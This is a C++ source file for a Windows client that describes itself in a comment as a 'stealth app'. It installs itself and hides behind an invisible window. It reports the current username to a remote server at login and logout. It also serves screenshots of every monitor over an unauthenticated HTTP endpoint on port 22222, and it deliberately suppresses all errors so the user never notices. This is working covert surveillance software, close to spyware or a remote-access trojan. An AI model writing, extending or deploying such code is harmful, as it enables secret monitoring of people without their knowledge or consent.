#define _WIN32_WINNT 0x0601
#include <tchar.h>
#include <signal.h>
#include <thread>
#include <chrono>
#include <mutex>
#include <cstdlib>
#include <fstream>
#include <iomanip>
#include <boost/property_tree/ptree.hpp>
#include <boost/property_tree/json_parser.hpp>
#include "../httpclient.h"
#include "../webserverlib/webserver.h"
#include "bitmaps.h"
#include "monitorscount.h"
#include "winapihelpers.h"

char userName[128];
DWORD userNameSize = (DWORD)sizeof(userName);
unsigned short listenPort;
unsigned short serverPort;
std::string serverAddress;

using WebServer = webserverlib::WebServer;

LRESULT Wndproc(
    HWND hWnd,
    UINT message,
    WPARAM wParam,
    LPARAM lParam)
{
    switch(message)
    {
    case WM_ENDSESSION:
        {
            HttpRequest loginReportRequest{ serverAddress, std::to_string(serverPort), std::string("/api/logout/") + userName, 11 };
            loginReportRequest.Get();
            return 0;
        }
    }
    return DefWindowProc(hWnd, message, wParam, lParam);
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR pCmdLine, int nCmdShow)
{
    try
    {
        std::string command{ pCmdLine };
        if (command == "--install")
            return winapi::Install();

        if (command == "--remove")
            return winapi::Uninstall();

        std::stringstream buffer;

        {
            std::ifstream ifconfigfile(winapi::ModuleFileDirectory() + "clientconfig.json");
            buffer << ifconfigfile.rdbuf();
            boost::property_tree::ptree configJsonRoot;
            boost::property_tree::read_json(buffer, configJsonRoot);
            serverAddress = configJsonRoot.get<std::string>("serveraddress");
            serverPort = configJsonRoot.get<unsigned short>("serverport");
            listenPort = configJsonRoot.get<unsigned short>("listenport");
        }

        HWND hWnd = winapi::CreateInvisibleWindow(hInstance, "mainwindowclass123", Wndproc);

        GetUserNameA(userName, &userNameSize);
        {
            HttpRequest loginReportRequest{ serverAddress, std::to_string(serverPort), std::string("/api/login/") + userName, 11 };
            loginReportRequest.Get();
        }


        WebServer webServer(
            WebServer::SetPort(22222),
            WebServer::SetRouter(
                webserverlib::Router
                {
                    {
                        "takescreenshot",
                        webserverlib::ApiEndPoint{[](webserverlib::HttpRequestContext& context)
                        {
                            int monitorIndex;
                            try
                            {
                                monitorIndex = atoi(context.GetPathStep().c_str());
                                if (monitorIndex > MonitorsCount())
                                    throw http::status::not_found;
                            }
                            catch (const std::exception&)
                            {
                                throw http::status::bad_request;
                            }

                            std::vector<unsigned char> screenShot(std::move(TakeScreenShot(monitorIndex)));

                            context.responseStream.write((const char*)&screenShot[0], screenShot.size());
                            context.headers[http::field::content_disposition] = "attachment; filename = img.bmp";
                            context.headers[http::field::content_type] = "image/bmp";
                            context.headers[http::field::content_transfer_encoding] = "binary";
                            context.headers[http::field::accept_ranges] = "bytes";

                        }}
                    },
                    {
                        "monitorscount",
                        webserverlib::ApiEndPoint{[](webserverlib::HttpRequestContext& context)
                        {
                            context.responseStream << "{ \"monitorsCount\" : " << MonitorsCount() << " }";
                        }}
                    }
                }));

        MSG msg = { };
        while (GetMessage(&msg, hWnd, 0, 0) > 0)
        {
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }
    }
    catch (const std::exception&)
    {
        //something goes wrong, but we dont want to show error messages to user
        //because this is stealth app
    }
    return 0;
}